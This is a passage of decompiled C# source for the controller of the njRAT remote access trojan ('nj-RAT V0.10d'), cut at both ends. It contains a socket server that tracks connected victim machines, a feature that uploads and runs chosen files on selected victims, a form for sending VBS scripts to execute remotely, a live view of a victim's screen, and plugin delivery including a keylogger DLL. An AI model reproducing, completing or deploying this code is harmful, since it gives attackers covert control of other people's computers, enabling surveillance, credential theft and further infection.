					"!",
					sokserver.Y,
					this.sk.ip(),
					sokserver.Y,
					Strings.Split(this.ComboBox1.Text, ",", -1, CompareMethod.Binary)[0],
					sokserver.Y,
					Strings.Split(this.ComboBox1.Text, ",", -1, CompareMethod.Binary)[1],
					sokserver.Y,
					Conversions.ToString(0)
				}));
			}
		}

		private void btnIniciar_Click(object sender, EventArgs e)
		{
		}

		private void CheckBox4_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox4.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.Folder);
				}
				catch (Exception expr_1F)
				{
					ProjectData.SetProjectError(expr_1F);
					Exception projectError = expr_1F;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}

		private void CheckBox3_CheckedChanged_1(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					MyProject.Forms.Frm_Main.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}

		private void P_MouseEnter(object sender, EventArgs e)
		{
			this.IsActive = true;
		}

		private void P_MouseLeave(object sender, EventArgs e)
		{
			this.IsActive = false;
		}

		private void P_MouseMove(object sender, MouseEventArgs e)
		{
			this.point_2 = e.Location;
			bool flag = this.point_2.Y < 20;
			if (flag)
			{
				this.Panel1.Visible = true;
			}
			else
			{
				this.Panel1.Visible = false;
			}
			PictureBox p = this.P;
			PictureBox obj = p;
			lock (obj)
			{
				flag = ((!this.P.Focused & this.CheckBox2.Checked) | this.CheckBox1.Checked);
				if (flag)
				{
					this.P.Focus();
				}
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;

namespace nj
{
	public class SK
	{
		public List<Client> Disconnect2;

		private Client[] IT;

		private bool OFF;

		public Collection Online2;

		public TcpListener S;

		public string SPL;

		public SK(int port)
		{
			this.Disconnect2 = new List<Client>();
			this.IT = new Client[101];
			this.OFF = false;
			this.Online2 = new Collection();
			this.SPL = "[endof]";
			this.S = new TcpListener(port);
			this.S.Server.SendTimeout = -1;
			this.S.Server.ReceiveTimeout = -1;
			this.S.Start();
			Thread thread = new Thread(new ThreadStart(this.WL), 1);
			thread.Start();
		}

		private void _Lambda__2(object a0)
		{
			this.READ(Conversions.ToInteger(RuntimeHelpers.GetObjectValue(a0)));
		}

		public Array fx(byte[] b)
		{
			List<byte[]> list = new List<byte[]>();
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			string[] array = Strings.Split(FN.BS(ref b), this.SPL, -1, CompareMethod.Binary);
			memoryStream.Write(b, 0, array[0].Length);
			checked
			{
				memoryStream2.Write(b, array[0].Length + this.SPL.Length, b.Length - (array[0].Length + this.SPL.Length));
				list.Add(memoryStream.ToArray());
				list.Add(memoryStream2.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				return list.ToArray();
			}
		}

		public Client GetClient(string ID)
		{
			Collection online = this.Online2;
			Collection obj = online;
			Client result;
			lock (obj)
			{
				try
				{
					result = (Client)online[ID];
					return result;
				}
				catch (Exception expr_27)
				{
					ProjectData.SetProjectError(expr_27);
					Exception projectError = expr_27;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				result = null;
			}
			return result;
		}

		public void pnd()
		{
			while (true)
			{
				try
				{
					Client client = new Client(this.S.AcceptTcpClient());
					client.Client.ReceiveTimeout = -1;
					client.Client.SendTimeout = -1;
					Collection online = this.Online2;
					Collection obj = online;
					lock (obj)
					{
						online.Add(client, client.ip(), null, null);
					}
					sokserver.Log("New Connection " + client.ip());
				}
				catch (Exception expr_7A)
				{
					ProjectData.SetProjectError(expr_7A);
					Exception ex = expr_7A;
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					sokserver.Log("errpnd " + ex2.Message);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}

		private void READ(int id)
		{
			checked
			{
				while (true)
				{
					while (this.IT[id] == null)
					{
						Thread.Sleep(1);
					}
					int value = 0;
					Client client = this.IT[id];
					bool flag = this.OFF || !client.CN;
					if (!flag)
					{
						try
						{
							value = 1;
							flag = !client.Client.Connected;
							if (flag)
							{
								goto IL_381;
							}
							flag = !client.IsPNGED;
							bool flag2;
							if (flag)
							{
								flag2 = (client.Ping <= 1200);
								if (!flag2)
								{
									client.IsPNGED = true;
									client.Ping = 0;
									flag2 = client.Send("P");
									if (!flag2)
									{
										value = 2;
										goto IL_381;
									}
								}
							}
							else
							{
								flag2 = (client.Ping > 3000);
								if (flag2)
								{
									value = 3;
									goto IL_381;
								}
							}
							flag2 = (client.Client.Available <= 0);
							if (!flag2)
							{
								byte[] array = new byte[client.Client.Available - 1 + 1 - 1 + 1];
								client.Client.Client.Receive(array, 0, array.Length, SocketFlags.None);
								sokserver.RC += array.Length;
								client.M.Write(array, 0, array.Length);
								while (true)
								{
									byte[] array2 = client.M.ToArray();
									flag2 = FN.BS(ref array2).Contains(this.SPL);
									if (!flag2)
									{
										goto IL_338;
									}
									Array array3 = this.fx(client.M.ToArray());
									object[] array4 = new object[1];
									int num = 0;
									array4[0] = num;
									byte[] array5 = (byte[])NewLateBinding.LateIndexGet(array3, array4, null);
									NewLateBinding.LateIndexSetComplex(array3, new object[]
									{
										num,
										array5
									}, null, true, false);
									flag2 = (Operators.CompareString(FN.BS(ref array5), "P", false) == 0);
									if (flag2)
									{
										value = 4;
										flag2 = (client.L == null);
										if (flag2)
										{
											break;
										}
										object[] array6 = new object[2];
										array6[0] = client;
										object[] arg_239_0 = array6;
										int arg_239_1 = 1;
										string text = "P" + sokserver.Y + Conversions.ToString(client.Ping);
										arg_239_0[arg_239_1] = FN.SB(ref text);
										sokserver.Req(array6);
										client.IsPNGED = false;
										client.Ping = 0;
									}
									else
									{
										sokserver.Req(new object[]
										{
											client,
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array3, new object[]
											{
												0
											}, null))))
										});
									}
									client.M.Dispose();
									client.M = new MemoryStream();
									flag2 = (array3.Length == 2);
									if (!flag2)
									{
										goto IL_337;
									}
									client.M.Write((byte[])NewLateBinding.LateIndexGet(array3, new object[]
									{
										1
									}, null), 0, Conversions.ToInteger(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array3, new object[]
									{
										1
									}, null)), null, "length", new object[0], null, null, null))));
								}
								goto IL_381;
								IL_337:
								IL_338:;
							}
						}
						catch (Exception expr_33B)
						{
							ProjectData.SetProjectError(expr_33B);
							Exception projectError = expr_33B;
							ProjectData.SetProjectError(projectError);
							value = 5;
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							goto IL_381;
						}
						IL_369:
						client.Buzy = false;
						this.IT[id] = null;
						continue;
						goto IL_369;
					}
					IL_381:
					client.T.Enabled = false;
					client.T.Dispose();
					client.CN = false;
					List<Client> disconnect = this.Disconnect2;
					List<Client> obj = disconnect;
					lock (obj)
					{
						disconnect.Add(client);
					}
					this.IT[id] = null;
					sokserver.Log("Disconnected " + Conversions.ToString(value) + " " + client.ip());
				}
			}
		}

		private void WL()
		{
			int num = 0;
			checked
			{
				int num2 = this.IT.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					new Thread(new ParameterizedThreadStart(this._Lambda__2), 0)
					{
						Priority = ThreadPriority.Lowest
					}.Start(i);
				}
				Thread thread = new Thread(new ThreadStart(this.pnd));
				thread.Start();
				while (true)
				{
					Collection online = this.Online2;
					Collection obj = online;
					lock (obj)
					{
						List<Client> disconnect = this.Disconnect2;
						List<Client> obj2 = disconnect;
						lock (obj2)
						{
							int num3 = 0;
							do
							{
								try
								{
									bool flag = disconnect.Count > 0;
									if (flag)
									{
										Client client = disconnect[0];
										disconnect.RemoveAt(0);
										try
										{
											client.Client.Client.Disconnect(false);
										}
										catch (Exception expr_D9)
										{
											ProjectData.SetProjectError(expr_D9);
											Exception projectError = expr_D9;
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											ProjectData.ClearProjectError();
										}
										try
										{
											client.Client.Close();
										}
										catch (Exception expr_10C)
										{
											ProjectData.SetProjectError(expr_10C);
											Exception projectError2 = expr_10C;
											ProjectData.SetProjectError(projectError2);
											ProjectData.ClearProjectError();
											ProjectData.ClearProjectError();
										}
										this.Online2.Remove(client.ip().ToString());
										thread = new Thread(new ParameterizedThreadStart(sokserver.Req), 1);
										object[] array = new object[2];
										array[0] = client;
										string text = "!";
										array[1] = FN.SB(ref text);
										thread.Start(array);
									}
								}
								catch (Exception expr_18A)
								{
									ProjectData.SetProjectError(expr_18A);
									Exception projectError3 = expr_18A;
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
								num3++;
							}
							while (num3 <= 0);
							int num4 = this.IT.Length - 1;
							for (int j = 0; j <= num4; j++)
							{
								bool flag = this.IT[j] == null;
								if (flag)
								{
									bool flag2 = this.Online2.Count <= 0;
									if (flag2)
									{
										break;
									}
									num++;
									flag2 = (num > this.Online2.Count);
									if (flag2)
									{
										num = 1;
									}
									Client client = (Client)this.Online2[num];
									flag2 = !client.Buzy;
									if (flag2)
									{
										client.Buzy = true;
										this.IT[j] = client;
									}
								}
							}
						}
					}
					IL_28E:
					Thread.Sleep(1);
					continue;
					goto IL_28E;
				}
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Script : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		[AccessedThroughProperty("ToolStripStatusLabel1")]
		private ToolStripStatusLabel _ToolStripStatusLabel1;

		[AccessedThroughProperty("ToolStripStatusLabel2")]
		private ToolStripStatusLabel _ToolStripStatusLabel2;

		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		public string Code;

		public Frm_Main F;

		public string RunAs;

		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel1_Click);
				bool flag = this._ToolStripStatusLabel1 != null;
				if (flag)
				{
					this._ToolStripStatusLabel1.Click -= value2;
				}
				this._ToolStripStatusLabel1 = value;
				flag = (this._ToolStripStatusLabel1 != null);
				if (flag)
				{
					this._ToolStripStatusLabel1.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel2_Click);
				bool flag = this._ToolStripStatusLabel2 != null;
				if (flag)
				{
					this._ToolStripStatusLabel2.Click -= value2;
				}
				this._ToolStripStatusLabel2 = value;
				flag = (this._ToolStripStatusLabel2 != null);
				if (flag)
				{
					this._ToolStripStatusLabel2.Click += value2;
				}
			}
		}

		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Script.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Script.__ENCList.Count == Script.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Script.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Script.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Script.__ENCList[num] = Script.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Script.__ENCList.RemoveRange(num, Script.__ENCList.Count - num);
						Script.__ENCList.Capacity = Script.__ENCList.Count;
					}
					Script.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Script));
			this.StatusStrip1 = new StatusStrip();
			this.ToolStripStatusLabel1 = new ToolStripStatusLabel();
			this.ToolStripStatusLabel2 = new ToolStripStatusLabel();
			this.TextBox1 = new TextBox();
			this.StatusStrip1.SuspendLayout();
			this.SuspendLayout();
			this.StatusStrip1.BackColor = SystemColors.ActiveCaptionText;
			this.StatusStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripStatusLabel1,
				this.ToolStripStatusLabel2
			});
			Control arg_A8_0 = this.StatusStrip1;
			Point location = new Point(0, 198);
			arg_A8_0.Location = location;
			this.StatusStrip1.Name = "StatusStrip1";
			Control arg_D6_0 = this.StatusStrip1;
			Size size = new Size(511, 22);
			arg_D6_0.Size = size;
			this.StatusStrip1.TabIndex = 0;
			this.StatusStrip1.Text = "StatusStrip1";
			this.ToolStripStatusLabel1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel1.ForeColor = Color.Magenta;
			this.ToolStripStatusLabel1.IsLink = true;
			this.ToolStripStatusLabel1.LinkColor = Color.LightSteelBlue;
			this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
			ToolStripItem arg_16C_0 = this.ToolStripStatusLabel1;
			size = new Size(26, 17);
			arg_16C_0.Size = size;
			this.ToolStripStatusLabel1.Text = "Sen";
			this.ToolStripStatusLabel2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripStatusLabel2.ForeColor = Color.Magenta;
			this.ToolStripStatusLabel2.IsLink = true;
			this.ToolStripStatusLabel2.LinkColor = Color.LightSteelBlue;
			this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
			ToolStripItem arg_1F5_0 = this.ToolStripStatusLabel2;
			size = new Size(72, 17);
			arg_1F5_0.Size = size;
			this.ToolStripStatusLabel2.Text = "Run As : Vbs";
			this.TextBox1.BackColor = Color.Black;
			this.TextBox1.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox1.Dock = DockStyle.Fill;
			this.TextBox1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.TextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_278_0 = this.TextBox1;
			location = new Point(0, 0);
			arg_278_0.Location = location;
			this.TextBox1.Multiline = true;
			this.TextBox1.Name = "TextBox1";
			Control arg_2B6_0 = this.TextBox1;
			size = new Size(511, 198);
			arg_2B6_0.Size = size;
			this.TextBox1.TabIndex = 1;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(511, 220);
			this.ClientSize = size;
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.StatusStrip1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Script";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Script";
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public Script()
		{
			base.FormClosing += new FormClosingEventHandler(this.Script_FormClosing);
			Script.__ENCAddToList(this);
			base.FormClosing += new FormClosingEventHandler(this.Script_FormClosing);
			this.RunAs = "vbs";
			this.Code = "";
			this.InitializeComponent();
		}

		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			this.Code = this.TextBox1.Text;
			this.Close();
		}

		private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Run As :", "", "vbs", -1, -1);
			bool flag = text.Length > 0;
			if (flag)
			{
				this.RunAs = text;
				this.ToolStripStatusLabel2.Text = "RunAs: " + text;
			}
		}

		private void Script_FormClosing(object sender, FormClosingEventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class slayermonitor : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("NyX_Theme1")]
		private NYX_Theme _NyX_Theme1;

		[AccessedThroughProperty("NyX_ControlBox1")]
		private NYX_ControlBox _NyX_ControlBox1;

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual NYX_Theme NyX_Theme1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Theme1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NyX_Theme1_Click);
				bool flag = this._NyX_Theme1 != null;
				if (flag)
				{
					this._NyX_Theme1.Click -= value2;
				}
				this._NyX_Theme1 = value;
				flag = (this._NyX_Theme1 != null);
				if (flag)
				{
					this._NyX_Theme1.Click += value2;
				}
			}
		}

		internal virtual NYX_ControlBox NyX_ControlBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_ControlBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_ControlBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		public slayermonitor()
		{
			base.Load += new EventHandler(this.slayermonitor_Load);
			slayermonitor.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = slayermonitor.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = slayermonitor.__ENCList.Count == slayermonitor.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = slayermonitor.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = slayermonitor.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									slayermonitor.__ENCList[num] = slayermonitor.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						slayermonitor.__ENCList.RemoveRange(num, slayermonitor.__ENCList.Count - num);
						slayermonitor.__ENCList.Capacity = slayermonitor.__ENCList.Count;
					}
					slayermonitor.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(slayermonitor));
			this.PictureBox1 = new PictureBox();
			this.Timer1 = new Timer(this.components);
			this.NyX_Theme1 = new NYX_Theme();
			this.NyX_ControlBox1 = new NYX_ControlBox();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.NyX_Theme1.SuspendLayout();
			this.SuspendLayout();
			this.PictureBox1.BackColor = Color.FromArgb(28, 28, 28);
			this.PictureBox1.BackgroundImageLayout = ImageLayout.Stretch;
			this.PictureBox1.BorderStyle = BorderStyle.FixedSingle;
			Control arg_B5_0 = this.PictureBox1;
			Point location = new Point(12, 28);
			arg_B5_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_E6_0 = this.PictureBox1;
			Size size = new Size(379, 201);
			arg_E6_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 0;
			this.PictureBox1.TabStop = false;
			this.NyX_Theme1.Animated = true;
			this.NyX_Theme1.BorderStyle = FormBorderStyle.None;
			this.NyX_Theme1.Colors = new Bloom[0];
			this.NyX_Theme1.Controls.Add(this.NyX_ControlBox1);
			this.NyX_Theme1.Customization = "";
			this.NyX_Theme1.Dock = DockStyle.Fill;
			this.NyX_Theme1.Font = new Font("Arial", 9f);
			this.NyX_Theme1.Image = null;
			Control arg_1AD_0 = this.NyX_Theme1;
			location = new Point(0, 0);
			arg_1AD_0.Location = location;
			this.NyX_Theme1.Movable = false;
			this.NyX_Theme1.Name = "NyX_Theme1";
			this.NyX_Theme1.NoRounding = false;
			this.NyX_Theme1.Sizable = false;
			Control arg_205_0 = this.NyX_Theme1;
			size = new Size(404, 249);
			arg_205_0.Size = size;
			this.NyX_Theme1.SmartBounds = true;
			this.NyX_Theme1.StartPosition = FormStartPosition.WindowsDefaultLocation;
			this.NyX_Theme1.TabIndex = 1;
			this.NyX_Theme1.Text = "Monitor";
			this.NyX_Theme1.TransparencyKey = Color.Fuchsia;
			this.NyX_Theme1.Transparent = false;
			this.NyX_ControlBox1.Colors = new Bloom[0];
			this.NyX_ControlBox1.Customization = "";
			this.NyX_ControlBox1.Font = new Font("Verdana", 8f);
			this.NyX_ControlBox1.Image = null;
			Control arg_2C1_0 = this.NyX_ControlBox1;
			location = new Point(353, 2);
			arg_2C1_0.Location = location;
			this.NyX_ControlBox1.Name = "NyX_ControlBox1";
			this.NyX_ControlBox1.NoRounding = false;
			Control arg_2F9_0 = this.NyX_ControlBox1;
			size = new Size(48, 23);
			arg_2F9_0.Size = size;
			this.NyX_ControlBox1.TabIndex = 0;
			this.NyX_ControlBox1.Text = "NyX_ControlBox1";
			this.NyX_ControlBox1.Transparent = false;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = SystemColors.ActiveCaptionText;
			this.BackgroundImageLayout = ImageLayout.Stretch;
			size = new Size(404, 249);
			this.ClientSize = size;
			this.Controls.Add(this.PictureBox1);
			this.Controls.Add(this.NyX_Theme1);
			this.FormBorderStyle = FormBorderStyle.None;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "slayermonitor";
			this.Opacity = 0.8;
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.Text = "slayermonitor";
			this.TransparencyKey = Color.Fuchsia;
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.NyX_Theme1.ResumeLayout(false);
			this.ResumeLayout(false);
		}

		private void slayermonitor_Load(object sender, EventArgs e)
		{
			checked
			{
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width;
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Height;
				this.PictureBox1.Image = MyProject.Forms.Frm_Main.P1.Image;
				this.Timer1.Start();
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.PictureBox1.Image = MyProject.Forms.Frm_Main.P1.Image;
		}

		private void NyX_Theme1_Click(object sender, EventArgs e)
		{
			checked
			{
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width;
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Height;
				this.PictureBox1.Image = MyProject.Forms.Frm_Main.P1.Image;
				this.Timer1.Start();
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace nj
{
	public class sokserver
	{
		public delegate void _Req(object obj);

		public static List<alrt> elt = new List<alrt>();

		public static bool ensr = true;

		public static Frm_Main F;

		public static int hac = 10;

		public static int hcam = 7;

		public static int hco = 5;

		public static int hin = 4;

		public static int hip = 1;

		public static int hname = 0;

		public static int hos = 6;

		public static int hpc = 2;

		public static int hping = 9;

		public static int huser = 3;

		public static int hvr = 8;

		private static List<Client> iNotSad = new List<Client>();

		public static List<Client> ISAd = new List<Client>();

		public static List<string> LG = new List<string>();

		public static nt nt = new nt();

		public static List<plg> Plug = new List<plg>();

		public static int RC = 0;

		public static int SNT = 0;

		public static List<Client> usb = new List<Client>();

		public static string vr = "nj-RAT V0.10d";

		public static SK W;

		public static string Y = "|Coringa|";

		[DebuggerNonUserCode]
		public sokserver()
		{
		}

		public static plg GETPLG(string Name = null, string Hash = null)
		{
			bool flag = Name != null;
			bool flag2;
			plg result;
			if (flag)
			{
				try
				{
					List<plg>.Enumerator enumerator = sokserver.Plug.GetEnumerator();
					while (enumerator.MoveNext())
					{
						plg current = enumerator.Current;
						flag2 = (Operators.CompareString(current.Name, Name.ToLower(), false) == 0);
						if (flag2)
						{
							result = current;
							return result;
						}
					}
				}
				finally
				{
					List<plg>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			flag2 = (Hash != null);
			if (flag2)
			{
				try
				{
					List<plg>.Enumerator enumerator2 = sokserver.Plug.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						plg current2 = enumerator2.Current;
						flag = (Operators.CompareString(current2.Hash, Hash, false) == 0);
						if (flag)
						{
							result = current2;
							return result;
						}
					}
				}
				finally
				{
					List<plg>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
			}
			result = null;
			return result;
		}

		public static Form Gform(string name)
		{
			return Application.OpenForms[name];
		}

		public static string BS(byte[] b)
		{
			return Encoding.Default.GetString(b);
		}

		public static Array fx(byte[] b, string WRD)
		{
			List<byte[]> list = new List<byte[]>();
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			string[] array = Strings.Split(sokserver.BS(b), WRD, -1, CompareMethod.Binary);
			memoryStream.Write(b, 0, array[0].Length);
			checked
			{
				memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
				list.Add(memoryStream.ToArray());
				list.Add(memoryStream2.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				return list.ToArray();
			}
		}

		public static bool SendPlug(Client c, plg p, bool ret)
		{
			bool result;
			try
			{
				string text;
				if (ret)
				{
					text = "ret" + sokserver.Y + p.Hash + sokserver.Y;
				}
				else
				{
					text = string.Concat(new string[]
					{
						"inv",
						sokserver.Y,
						p.Hash,
						sokserver.Y,
						c.ip(),
						sokserver.Y
					});
				}
				MemoryStream memoryStream = new MemoryStream();
				bool flag = Operators.CompareString(p.Name, "kl.dll", false) == 0;
				if (flag)
				{
					text = text.Replace(p.Hash, "kl");
					memoryStream.Write(FN.SB(ref text), 0, text.Length);
					memoryStream.Write(FN.SB(ref p.B), 0, p.B.Length);
				}
				else
				{
					memoryStream.Write(FN.SB(ref text), 0, text.Length);
					flag = !c.plg.Contains(p.Hash);
					if (flag)
					{
						memoryStream.Write(FN.SB(ref p.B), 0, p.B.Length);
					}
					else
					{
						memoryStream.WriteByte(40);
					}
				}
				c.Ping = -9000;
